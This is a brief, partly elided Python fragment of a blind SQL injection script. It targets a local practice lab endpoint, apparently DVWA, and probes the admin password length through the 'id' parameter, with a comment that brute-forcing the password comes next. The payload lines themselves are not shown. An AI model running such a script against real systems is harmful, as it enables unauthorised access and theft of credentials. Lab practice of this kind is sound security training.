...
url = "http://127.0.0.1:42001/vulnerabilities/sqli_blind/?" #id={payload}&Submit=Submit#"
s = session()
cookies={
         "language": "en", 
...
for i in range(max_len, 0, -1):
    ...
    url_with_param = url.format(payload=payload)
    response = s.get(url, params= {"id": payload, "Submit": "Submit"},cookies=cookies)
...
#now that we are suppose to have admin password length, we can bruteforce it
